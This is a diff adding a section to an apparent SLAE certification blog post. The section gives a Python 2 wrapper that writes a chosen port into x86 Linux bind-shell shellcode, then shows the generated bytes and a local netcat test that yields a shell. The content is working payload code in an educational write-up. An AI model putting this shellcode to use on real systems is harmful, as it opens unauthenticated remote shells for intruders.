@@ -413,3 +413,65 @@ uname -a
 Linux kali 5.4.0-kali3-686-pae #1 SMP Debian 5.4.13-1kali1 (2020-01-20) i686 GNU/Linux
 ```
 Boom! it works :)
+
+### Customizable Port
+In order to complete this requirement, I've written a very simple python wrapper script that replaces the port in the shellcode with the desired port. Keep in mind that this is extremely simple, and to make this script more useful, checks for port numbers can also be included, along with better length checks.
+
+```python
+#!/usr/bin/python
+
+# SLAE Assignment 1: Simple Python Port Change Wrapper Script
+# Author:  4p0cryph0n
+# Website: https://4p0cryph0n.github.io/
+
+import sys
+import socket
+
+port = int(sys.argv[1])
+
+phtons = hex(socket.htons(int(port)))
+
+half1 = phtons[4:]
+half2 = phtons[2:4]
+
+if half1 == "00" or half2 == "00":
+        print "Port contains NULL"
+        exit(1)
+
+shellcode =  '\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\x6a\\x66\\x58\\x43\\x52'
+shellcode += '\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\x6a\\x66\\x58'
+shellcode += '\\x43\\x52\\x66\\x68\\x11\\x5b\\x66\\x53\\x89\\xe1\\x6a\\x10'
+shellcode += '\\x51\\x56\\x89\\xe1\\xcd\\x80\\x31\\xc0\\xb0\\x66\\x43\\x43'
+shellcode += '\\x53\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\x43\\x52\\x52\\x56'
+shellcode += '\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x31\\xc9\\xb1\\x03\\x31\\xc0'
+shellcode += '\\xb0\\x3f\\x89\\xfb\\xfe\\xc9\\xcd\\x80\\x75\\xf4\\x31\\xc9'
+shellcode += '\\x51\\x6a\\x0b\\x58\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62'
+shellcode += '\\x69\\x6e\\x89\\xe3\\xcd\\x80'
+
+shellcode = shellcode.replace('\\x11\\x5b', '\\x{}\\x{}'.format(half1, half2))
+print shellcode
+```
+Let's try this out with port 1337:
+```
+$ python2 change_port.py 1337
+\x31\xc0\x31\xdb\x31\xc9\x99\x6a\x66\x58\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x6a\x66\x58\x43\x52\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x43\x43\x53\x56\x89\xe1\xcd\x80\xb0\x66\x43\x52\x52\x56\x89\xe1\xcd\x80\x89\xc7\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc9\x51\x6a\x0b\x58\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
+
+We paste this into shellcode.c, and compile it
+
+Terminal 1:
+$ ./shellcode
+Shellcode Length:  102
+
+Terminal 2:
+$ nc -nv 127.0.0.1 1337
+(UNKNOWN) [127.0.0.1] 1337 (?) open
+uname -a
+Linux kali 5.4.0-kali3-686-pae #1 SMP Debian 5.4.13-1kali1 (2020-01-20) i686 GNU/Linux
+```
+Annnndddd with this, we finally wrap up Assignment 1. This was fun!
+
+This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.
+
+http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
+
+Student ID: SLAE - 1534
